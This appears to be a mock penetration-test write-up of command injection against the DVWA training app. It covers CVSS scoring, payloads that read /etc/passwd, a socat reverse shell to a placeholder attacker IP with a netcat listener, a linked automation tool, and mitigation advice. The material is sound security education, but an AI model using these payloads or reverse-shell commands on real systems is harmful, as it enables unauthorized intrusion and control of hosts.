# Command Injection Vulnerabilty and RCE in DVWA  

## Table of Contents
- [**Outline**](#section-0)
- [**Vulnerabiltiy Explanation**](#section-1)
- [ **Proof of Concept - Creating a Reverse Shell**](#section-2)
- [**Developing a Tool**](#section-3)
- [**Mitigating Command Injection Attacks**](#section-4)

## Outline {#section-0}
The goal of this write-up is to document and demonstrate various OS command injection attacks performed  against the  Damn Vulnerable Web Application (DVWA) input field. The objective of this attack was to gain unathorized access to the system as `www-data` service user.This report mocks a penetration testing report and a debriefing situation to a client.
The full mock debriefing can be found here: [Full Presentation ](https://www.youtube.com/watch?v=Phlb5Tz4sws)
## Vulnerabiltiy Explanation {#section-1}
A command injection vulnerability is a security flaw in a system that allows attackers to execute arbitrary commands on the host's operating system. This is a serious security flaw
as it allows attackers to gain unauthorized access, opening further attack vectors for the attacker. If the application/user has high privilege a compromised system could extend beyond the host system and impact the entire network or infrastructure.

| Information | Explanation                                                                      |
|-------------|----------------------------------------------------------------------------------|
| Name        | Command Injection                                                                |
| Severity    | High                                                                             |
| CVSS        | 8.4                                                                              |
| Path        | http://127.0.0.1/vulnerabilities/exec/



The base CVSS was calculated upon the following metrics.  

| Base Metrics               | Explanations                                                                                             |
|----------------------------|----------------------------------------------------------------------------------------------------------|
| Attack Vector (AV)         | Network(N) The vulnerability can be exploited remotely over a network connection.                        |
| Attack Complexity (AC)     | Low (L) The vulnerability is straightforward and requires minimal or no special knowledge.               |
| Privilege Required (PR)    | Low (L) The attack requires some privilege. The user has to login to DVWA webpage to conduct the exploit |
| User Intercation (UI)      | None (N) The vulnerability can be exploited without any user interaction.                                |
| Scope (S)                  | Unchanged(S:U) An exploit can only affect the specific system                                            |
| Confidentiality Impact (C) | Medium (M) The vulnerability has medium impact on  the confidentiality of information.                   |
| Integrity Impact (I)       | High (H) The vulnerability has a signigicant impact on the integrity of the information                  |
| Availability Impact (A)    | High (H) The vulnerability has a significant impact on the availability of the system or resource.       |


## Proof of Concept {#section-2}
For the Proof of Concept (POC) in the `Security-Low-Level` module, the tester has manually discovered that the input field is vulnerable to command injection. By providing an IP address augmented with the `&&` operator and a preferred command, such as `/etc/passwd`, the tester  was able to view sensitive data from the system. The `&&` operator executes the first command and then proceeds to the next command, enabling the testers to execute any command.
```bash
127.0.0.1 && cat /etc/passwd 
``` 
![](/assets/cinject/exposed.gif)

The tester has also further discovered that the input field is vulnerable to other operators, such as `;`, `|`, `&` and `||`. This vulnerability exists primarily due to lack of input validation and sanitization. It can be seen from the source code that there is zero meaures to validate or sanitize user input. 
  ![](/assets/cinject/low.png)

For the `Security-Medium-Level` module, after some trial and error, the tester figured out that the input field was still vulnerable to the pip operator `|` and led to the same result as the above. There were some sanitization but was not extensive with the various operators, leaving the application largly vulnerable.
![](/assets/cinject/medium.png)


After some more trial and error with the `Security-High-Level` module, the tester has discovered that the `|` pipe operator was still vulnerable. Upon closer inspection of the source code, the tester identified a minor mistake in the sanitization of user input. Instead of replacing the pipe operator `|` with a blank string as intended , the developer mistakenly added a blank space within the operator `'| '`, which does not exactly target the pip operator as intended. Thus the code resulted in inadequate sanitization of user input.
![](/assets/cinject/High.png)


## Establishing a Reverse Shell {#section-2}
To take steps further, the tester has made use of `socat`, a popular networking tool, to create a reverse TCP connection back to the testing machine establishing a reverse shell.  First the tester created a socat listener on the attacking machine and executed a socat reverse shell in the input field using the following commands.
```bash
nc -nlvp 1337
``` 
```bash
127.0.0.1|socat tcp-connect:Attacker_IP:1337 exec:bash
``` 
![](/assets/cinject/reverseShell.gif)

The tester was granted a full command-line interface shell, offering complete control over the compromised system. This provided the ability to execute commands and easily navigate the file system, opening up possibilities for potential privilege escalation and lateral movement within the internal network.

Initially, attempts to establish a reverse shell using `bash` and `netcat` were unsuccessful. However, through further trial and error using different networking tools such as `socat`, a successful reverse shell was achieved. This highlights the importance of persistence, experimentation, and utilizing a variety of tools during a penetration test.


## Developing a Python Tool {#section-3}
To streamline and automate the process, the tester has developed a Python script that scans for command injection vulnerabilities and, upon successful identification, proceeds to execute a Remote Code Execution (RCE). This approach simplifies the task and enhances efficiency in identifying and leveraging potential security weaknesses.
The script can be found here [Kwang Command Injection RCE Tool](https://github.com/Kwangyun/Web-Automation-Tools/blob/main/CInjectionRCE.py) \
![](/assets/cinject/myScript.gif)
The tool can be used as the following with `-u`, `-p` reverse shell port and `-i` the revershell IP
```bash
python CInjectionRCE.py -u http://127.0.0.1/vulnerabilities/exec/ -p 1234 -i 192.168.45.193
``` 

## Mitigating Command Injection Attacks {#section-4}

### User Input Validation
User Input Validation involves verifying whether a user's input satisfies the conditions established by the developer. There are two primary approaches to input validation: the Blacklist-based approach and the Whitelist-based approach.  
#### Blacklist-based approach
The Blacklist-based approach entails checking whether the user input contains any characters present in a predefined blacklist. However, this method is susceptible to human error, as exemplified by the `Security-High-Level` module, and is therefore not recommended. The following are some functions corresponding to each language that are vulnerable to command injection. 
#### Whitelist-based approch
In contrast, the Whitelist-based approach checks input values against a predefined list of permitted values. In this approach, the application ensures that the input matches safe and expected values. For example, in this application, the developers could have verified that the user input is an alphanumeric string in the form of an IP address, consisting of four octets, without any additional syntax or whitespace.

## User Input Sanitization
Contrary to user input validation, user input sanitization  modifies or removes potentially harmful elements from the input data. The objective of input sanitization is to enhance the security and integrity of the application by neutralizing or eliminating any characters or patterns that could be exploited. Sanitization methods include techniques such as escaping, filtering and whitelisting. 
Reference: [Grootboan Security](https://security.grootboan.com/)\
            [PortSwigger](https://portswigger.net/web-security/os-command-injection)